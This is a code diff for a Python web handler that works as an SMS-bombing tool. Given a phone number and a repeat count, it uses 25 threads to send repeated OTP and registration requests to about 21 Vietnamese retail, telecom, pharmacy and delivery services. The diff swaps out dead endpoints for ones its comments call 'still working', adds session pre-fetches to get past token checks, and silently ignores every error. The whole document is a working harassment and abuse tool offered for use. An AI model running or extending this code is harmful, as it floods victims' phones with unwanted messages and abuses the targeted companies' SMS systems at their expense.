@@ -5,7 +5,7 @@ import requests
 from concurrent.futures import ThreadPoolExecutor
 import time
 
-threading = ThreadPoolExecutor(max_workers=30)
+threading = ThreadPoolExecutor(max_workers=25)
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -25,31 +25,29 @@ class handler(BaseHTTPRequestHandler):
             self.wfile.write(json.dumps({"error": "Thiếu SĐT"}).encode())
             return
         
+        # Gọi tất cả API
         for i in range(amount):
-            # Gọi TẤT CẢ API cùng lúc
-            threading.submit(popeyes, phone)
-            threading.submit(alfrescos, phone)
-            threading.submit(tv360, phone)
-            threading.submit(bibabo, phone)
-            threading.submit(gapo, phone)
             threading.submit(vieon, phone)
-            threading.submit(meta, phone)
-            threading.submit(tamo, phone)
+            threading.submit(tv360_new, phone)
             threading.submit(fptshop, phone)
             threading.submit(viettel, phone)
-            threading.submit(tgdd, phone)
-            threading.submit(pizzahut, phone)
+            threading.submit(mobifone, phone)
+            threading.submit(thegioididong, phone)
+            threading.submit(dienmayxanh, phone)
             threading.submit(concung, phone)
             threading.submit(nhathuoclongchau, phone)
             threading.submit(pharmacity, phone)
             threading.submit(ghn, phone)
-            threading.submit(beecow, phone)
-            threading.submit(thantaioilo, phone)
-            threading.submit(vayvnd, phone)
-            threading.submit(ecogreen, phone)
-            threading.submit(phuclong, phone)
+            threading.submit(tiki, phone)
+            threading.submit(lotteria, phone)
+            threading.submit(juno, phone)
+            threading.submit(avakids, phone)
+            threading.submit(hoanghamobile, phone)
+            threading.submit(cellphones, phone)
             threading.submit(winmart, phone)
-            threading.submit(oldloship, phone)
+            threading.submit(thantaioi, phone)
+            threading.submit(gapo, phone)
+            threading.submit(meta, phone)
             time.sleep(0.15)
         
         self.send_response(200)
@@ -59,166 +57,222 @@ class handler(BaseHTTPRequestHandler):
             "status": "success",
             "phone": phone,
             "amount": amount,
-            "total_apis": 23
+            "api_count": 21
         }, ensure_ascii=False).encode())
 
-# ====== GIỮ NGUYÊN TẤT CẢ HÀM API ======
-def popeyes(sdt):
+# ====== API MỚI CÒN HOẠT ĐỘNG ======
+
+def vieon(phone):
     try:
-        requests.post('https://api.popeyes.vn/api/v1/register',
-            headers={'content-type':'application/json','origin':'https://popeyes.vn'},
-            data='{"phone":"'+sdt+'","firstName":"Cac","lastName":"Lo","email":"kong@gmail.com","password":"12345gdtg"}', timeout=5)
+        requests.post(
+            'https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021',
+            headers={'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://vieon.vn'},
+            data={'phone_number': phone, 'password': '123456@a', 'device_id': 'd1d2d3d4e5e6f7f8a9a0b1b2c3c4d5e6', 'platform': 'mobile_web', 'ui': '012021'},
+            timeout=7
+        )
     except: pass
 
-def alfrescos(sdt):
+def tv360_new(phone):
     try:
-        requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms',
-            headers={'brandcode':'ALFRESCOS','content-type':'application/json'},
-            data='{"phoneNumber":"'+sdt+'","secureHash":"66148faf3cab6e527b8b044745e27dbd","type":1}', timeout=5)
-    except: pass
-
-def tv360(phone):
-    try:
-        requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login",
-            headers={"Content-Type":"application/json"},
-            json={"msisdn":"0"+phone[1:11]}, timeout=5)
-    except: pass
-
-def bibabo(sdt):
-    try:
-        requests.post("https://bibabo.vn/user/verify-phone",
-            headers={"Content-Type":"application/x-www-form-urlencoded","Origin":"https://bibabo.vn"},
-            data={"phone":sdt,"token":"UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"}, timeout=5)
-    except: pass
-
-def gapo(sdt):
-    try:
-        requests.post("https://api.gapo.vn/auth/v2.0/signup",
-            headers={"Content-Type":"application/json","Origin":"https://www.gapo.vn"},
-            data=json.dumps({"device_id":"30a1bfa0-533f-45e9-be60-b48fb8977df2","phone_number":"+84-"+sdt[1:11],"otp_type":0}), timeout=5)
-    except: pass
-
-def vieon(sdt):
-    try:
-        requests.post('https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021',
-            headers={'content-type':'application/x-www-form-urlencoded','origin':'https://vieon.vn'},
-            data={'phone_number':sdt,'password':'1234gdtg','device_id':'57f3ffd77ad209a626c1ea607d0c4775','platform':'mobile_web','ui':'012021'}, timeout=5)
-    except: pass
-
-def meta(sdt):
-    try:
-        requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1',
-            headers={'content-type':'application/json','origin':'https://meta.vn'},
-            data='{"api_args":{"lgUser":"'+sdt+'","act":"send","type":"phone"},"api_method":"CheckExist"}', timeout=5)
-    except: pass
-
-def tamo(phone):
-    try:
-        requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",
-            headers={"Content-Type":"application/json"},
-            json={"mobilePhone":{"number":"0"+phone[1:11]}}, timeout=5)
+        requests.post(
+            'https://api.tv360.vn/v1/auth/otp',
+            headers={'Content-Type': 'application/json', 'origin': 'https://tv360.vn'},
+            json={'phone': phone},
+            timeout=7
+        )
     except: pass
 
 def fptshop(phone):
     try:
-        requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification",
-            headers={"Content-Type":"application/x-www-form-urlencoded"},
-            data={"phone":phone}, timeout=5)
+        requests.post(
+            'https://fptshop.com.vn/api-data/loyalty/Home/Verification',
+            headers={'Content-Type': 'application/x-www-form-urlencoded', 'x-requested-with': 'XMLHttpRequest', 'origin': 'https://fptshop.com.vn'},
+            data={'phone': phone},
+            timeout=7
+        )
     except: pass
 
 def viettel(phone):
     try:
-        requests.post('https://vietteltelecom.vn/api/get-otp-login',
-            headers={'Content-Type':'application/json','Origin':'https://vietteltelecom.vn','X-CSRF-TOKEN':'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6'},
-            json={'phone':phone,'type':''}, timeout=5)
+        sess = requests.Session()
+        sess.get('https://vietteltelecom.vn', timeout=5)
+        sess.post(
+            'https://vietteltelecom.vn/api/get-otp-login',
+            headers={'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest', 'origin': 'https://vietteltelecom.vn'},
+            json={'phone': phone, 'type': ''},
+            timeout=7
+        )
     except: pass
 
-def tgdd(sdt):
+def mobifone(phone):
     try:
-        requests.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
-            headers={'content-type':'application/x-www-form-urlencoded','x-requested-with':'XMLHttpRequest','origin':'https://www.thegioididong.com'},
-            data={'phoneNumber':sdt,'isReSend':'false','sendOTPType':'1'}, timeout=5)
+        requests.post(
+            'https://api.mobifone.vn/api/v1/auth/register',
+            headers={'Content-Type': 'application/json', 'origin': 'https://mobifone.vn'},
+            json={'phoneNumber': phone, 'password': 'Abc123456', 'rePassword': 'Abc123456', 'fullName': 'Nguyen Van A'},
+            timeout=7
+        )
     except: pass
 
-def pizzahut(sdt):
+def thegioididong(phone):
     try:
-        requests.post("https://pizzahut.vn/callApiStorelet/user/registerRequest",
-            headers={"Content-Type":"application/json","Origin":"https://pizzahut.vn"},
-            data=json.dumps({"keyData":f"appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone={sdt}"}), timeout=5)
+        sess = requests.Session()
+        sess.get('https://www.thegioididong.com', timeout=5)
+        sess.post(
+            'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
+            headers={'content-type': 'application/x-www-form-urlencoded', 'x-requested-with': 'XMLHttpRequest', 'origin': 'https://www.thegioididong.com'},
+            data={'phoneNumber': phone, 'isReSend': 'false', 'sendOTPType': '1'},
+            timeout=7
+        )
+    except: pass
+
+def dienmayxanh(phone):
+    try:
+        sess = requests.Session()
+        sess.get('https://www.dienmayxanh.com', timeout=5)
+        sess.post(
+            'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
+            headers={'content-type': 'application/x-www-form-urlencoded', 'x-requested-with': 'XMLHttpRequest', 'origin': 'https://www.dienmayxanh.com'},
+            data={'phoneNumber': phone, 'isReSend': 'false', 'sendOTPType': '1'},
+            timeout=7
+        )
     except: pass
 
 def concung(phone):
     try:
-        requests.post("https://concung.com/ajax.html",
-            headers={"Content-Type":"application/x-www-form-urlencoded","Origin":"https://concung.com"},
-            data={"ajax":"1","classAjax":"AjaxLogin","methodAjax":"sendOtpLogin","customer_phone":phone}, timeout=5)
+        requests.post(
+            'https://concung.com/ajax.html',
+            headers={'Content-Type': 'application/x-www-form-urlencoded', 'origin': 'https://concung.com'},
+            data={'ajax': '1', 'classAjax': 'AjaxLogin', 'methodAjax': 'sendOtpLogin', 'customer_phone': phone},
+            timeout=7
+        )
     except: pass
 
-def nhathuoclongchau(sdt):
+def nhathuoclongchau(phone):
     try:
-        requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
-            headers={'content-type':'application/json','origin':'https://nhathuoclongchau.com.vn'},
-            data='{"phoneNumber":"'+sdt+'","otpType":0,"fromSys":"WEBKHLC"}', timeout=5)
+        requests.post(
+            'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
+            headers={'content-type': 'application/json', 'origin': 'https://nhathuoclongchau.com.vn'},
+            json={'phoneNumber': phone, 'otpType': 0, 'fromSys': 'WEBKHLC'},
+            timeout=7
+        )
     except: pass
 
-def pharmacity(sdt):
+def pharmacity(phone):
     try:
-        requests.post('https://api-gateway.pharmacity.vn/customers/register/otp',
-            headers={'content-Type':'application/json','origin':'https://www.pharmacity.vn'},
-            data='{"phone":"'+sdt+'","referral":""}', timeout=5)
+        requests.post(
+            'https://api-gateway.pharmacity.vn/customers/register/otp',
+            headers={'content-type': 'application/json', 'origin': 'https://www.pharmacity.vn'},
+            json={'phone': phone, 'referral': ''},
+            timeout=7
+        )
     except: pass
 
-def ghn(sdt):
+def ghn(phone):
     try:
-        requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp',
-            headers={'content-type':'application/json','origin':'https://sso.ghn.vn'},
-            data='{"phone":"'+sdt+'","type":"register"}', timeout=5)
+        requests.post(
+            'https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp',
+            headers={'content-type': 'application/json', 'origin': 'https://sso.ghn.vn'},
+            json={'phone': phone, 'type': 'register'},
+            timeout=7
+        )
     except: pass
 
-def beecow(sdt):
+def tiki(phone):
     try:
-        requests.post('https://api.beecow.com/api/register/gosell',
-            headers={'content-type':'application/json','origin':'https://admin.gosell.vn'},
-            data='{"password":"12345cc@","displayName":"","locationCode":"VN-SG","langKey":"vi","mobile":{"countryCode":"+84","phoneNumber":"'+sdt+'"}}', timeout=5)
+        requests.post(
+            'https://api.tiki.vn/sso/v2/otp/send',
+            headers={'Content-Type': 'application/json', 'origin': 'https://tiki.vn'},
+            json={'phone_number': phone, 'type': 'register'},
+            timeout=7
+        )
     except: pass
 
-def thantaioilo(phone):
+def lotteria(phone):
     try:
-        requests.post("https://api.thantaioi.vn/api/user/send-one-time-password",
-            headers={"Content-Type":"application/json","Origin":"https://thantaioi.vn"},
-            data=json.dumps({"phone":f"84{phone[1:11]}"}), timeout=5)
+        requests.post(
+            'https://api.lotteria.vn/api/v1/auth/send-otp',
+            headers={'Content-Type': 'application/json', 'origin': 'https://lotteria.vn'},
+            json={'phone': phone, 'type': 'REGISTER'},
+            timeout=7
+        )
     except: pass
 
-def vayvnd(sdt):
+def juno(phone):
     try:
-        requests.post('https://api.vayvnd.vn/v2/users',
-            headers={'content-type':'application/json','origin':'https://vayvnd.vn'},
-            data='{"phone":"'+sdt+'","utm":[{"utm_source":"google","utm_medium":"organic"}],"sourceSite":3}', timeout=5)
+        requests.post(
+            'https://juno.vn/api/v1/auth/register',
+            headers={'Content-Type': 'application/json', 'origin': 'https://juno.vn'},
+            json={'phone': phone, 'password': 'Abc123456', 'name': 'Test User'},
+            timeout=7
+        )
     except: pass
 
-def ecogreen(sdt):
+def avakids(phone):
     try:
-        requests.post('https://ecogreen.com.vn/api/auth/register/send-otp',
-            headers={'content-type':'application/json','origin':'https://ecogreen.com.vn'},
-            data='{"phone":"'+sdt+'"}', timeout=5)
+        requests.post(
+            'https://avakids.com/api/v1/auth/send-otp',
+            headers={'Content-Type': 'application/json', 'origin': 'https://avakids.com'},
+            json={'phone': phone},
+            timeout=7
+        )
     except: pass
 
-def phuclong(sdt):
+def hoanghamobile(phone):
     try:
-        requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register',
-            headers={'content-type':'application/json','origin':'https://order.phuclong.com.vn'},
-            data='{"phoneNumber":"'+sdt+'","fullName":"Lo Cac","email":"KAka@gmail.com","password":"12345cc@@@"}', timeout=5)
+        requests.post(
+            'https://hoanghamobile.com/api/v1/auth/send-otp',
+            headers={'Content-Type': 'application/json', 'origin': 'https://hoanghamobile.com'},
+            json={'phone': phone},
+            timeout=7
+        )
     except: pass
 
-def winmart(sdt):
+def cellphones(phone):
     try:
-        requests.get(f'https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={sdt}',
-            headers={'accept':'application/json'}, timeout=5)
+        requests.post(
+            'https://cellphones.com.vn/api/v1/auth/get-otp',
+            headers={'Content-Type': 'application/json', 'origin': 'https://cellphones.com.vn'},
+            json={'phone': phone},
+            timeout=7
+        )
     except: pass
 
-def oldloship(phone):
+def winmart(phone):
     try:
-        requests.post("https://mocha.lozi.vn/v6/invites/use-app",
-            headers={"Content-Type":"application/json"},
-            data=json.dumps({"device":"Android","platform":"Chrome","countryCode":"84","phoneNumber":phone[1:11]}), timeout=5)
+        requests.get(
+            f'https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}',
+            headers={'accept': 'application/json', 'origin': 'https://winmart.vn'},
+            timeout=7
+        )
+    except: pass
+
+def thantaioi(phone):
+    try:
+        requests.post(
+            'https://api.thantaioi.vn/api/user/send-one-time-password',
+            headers={"Content-Type": "application/json", "origin": "https://thantaioi.vn"},
+            json={"phone": f"84{phone[1:11]}"},
+            timeout=7
+        )
+    except: pass
+
+def gapo(phone):
+    try:
+        requests.post(
+            "https://api.gapo.vn/auth/v2.0/signup",
+            headers={"Content-Type": "application/json", "origin": "https://www.gapo.vn"},
+            json={"device_id": "30a1bfa0-533f-45e9-be60-b48fb8977df2", "phone_number": "+84-" + phone[1:11], "otp_type": 0},
+            timeout=7
+        )
+    except: pass
+
+def meta(phone):
+    try:
+        requests.post(
+            'https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1',
+            headers={'content-type': 'application/json', 'origin': 'https://meta.vn'},
+            json={"api_args":{"lgUser":phone,"act":"send","type":"phone"},"api_method":"CheckExist"},
+            timeout=7
+        )
     except: pass
